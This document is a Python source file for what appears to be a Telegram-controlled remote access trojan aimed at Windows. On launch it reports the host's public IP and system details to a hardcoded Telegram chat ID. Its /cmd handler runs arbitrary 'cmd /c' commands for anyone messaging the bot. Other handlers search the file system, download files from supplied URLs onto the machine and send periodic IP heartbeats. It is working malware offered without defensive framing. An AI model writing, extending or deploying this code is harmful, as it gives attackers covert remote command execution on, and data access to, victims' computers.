import os
import subprocess
import time
import requests
import telebot
from telebot import types, apihelper
import platform
import threading

# Proxy configuration
#apihelper.proxy = {'https': 'http://127.0.0.1:7890', 'http': 'http://127.0.0.1:7890'}

# Telegram Bot Token
TOKEN = ''
bot = telebot.TeleBot(TOKEN)

# Store user heartbeat information
user_heartbeat = {}

# Function to get public IP address
def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        ip = response.json().get('ip')
        return ip
    except Exception as e:
        return f"获取公网IP错误：{str(e)}"

# Function to get system information (excluding Python version)
def get_system_info():
    system = platform.system()
    release = platform.release()
    version = platform.version()
    machine = platform.machine()
    processor = platform.processor()
    info = (
        f"系统: {system}\n"
        f"发行版: {release}\n"
        f"版本号: {version}\n"
        f"机器: {machine}\n"
        f"处理器: {processor}"
    )
    return info

# Function to send startup information to a specific user (chat ID: 6909201104)
def send_startup_info():
    public_ip = get_public_ip()
    system_info = get_system_info()
    message_content = f"[上线通知]\n公网IP: {public_ip}\n\n系统信息:\n{system_info}"
    bot.send_message(6909201104, message_content)

# Handler for /cmd command: execute a cmd command
@bot.message_handler(commands=['cmd'])
def handle_cmd(message):
    command_text = " ".join(message.text.split()[1:])
    if command_text:
        try:
            result = subprocess.check_output(f"cmd /c {command_text}", shell=True, stderr=subprocess.STDOUT, text=True)
            bot.reply_to(message, f"命令执行成功：\n{result}")
        except subprocess.CalledProcessError as e:
            bot.reply_to(message, f"命令执行出错：\n{e.output}")
    else:
        bot.reply_to(message, "请提供要执行的命令。")

# Function to periodically send the current public IP
def periodic_send_public_ip(chat_id):
    while True:
        time.sleep(60)
        current_ip = get_public_ip()
        bot.send_message(chat_id, f"当前公网IP：{current_ip}")

# Handler for /heartbeat command: record heartbeat and start periodic IP sending
@bot.message_handler(commands=['heartbeat'])
def handle_heartbeat(message):
    user_id = message.from_user.id
    user_heartbeat[user_id] = time.time()
    public_ip = get_public_ip()
    bot.reply_to(message, f"心跳记录时间：{time.ctime(user_heartbeat[user_id])}\n当前公网IP：{public_ip}")
    
    # Start a new thread to periodically send the public IP without blocking other commands
    t = threading.Thread(target=periodic_send_public_ip, args=(message.chat.id,))
    t.daemon = True
    t.start()

# Handler for /search command: recursively search for a file in the specified folder
@bot.message_handler(commands=['search'])
def handle_search(message):
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "用法：/search <文件名> <文件夹路径>")
        return

    filename = args[1]
    folder = args[2]
    found_files = []

    for root, dirs, files in os.walk(folder):
        if filename in files:
            found_files.append(os.path.join(root, filename))

    if found_files:
        bot.reply_to(message, "\n".join(found_files))
    else:
        bot.reply_to(message, f"在 {folder} 中未找到文件：{filename}")

# Handler for /upload command: download a file from the provided URL
@bot.message_handler(commands=['upload'])
def handle_upload(message):
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "用法：/upload <文件URL>")
        return

    file_url = args[1]
    filename = file_url.split("/")[-1]

    try:
        response = requests.get(file_url)
        with open(filename, 'wb') as f:
            f.write(response.content)
        bot.reply_to(message, f"文件 {filename} 下载成功。")
    except Exception as e:
        bot.reply_to(message, f"下载文件出错：{str(e)}")

# Start polling for messages
def start_polling():
    print("客户端启动，正在监听命令...")
    send_startup_info()
    bot.polling(non_stop=True)

if __name__ == "__main__":
    start_polling()
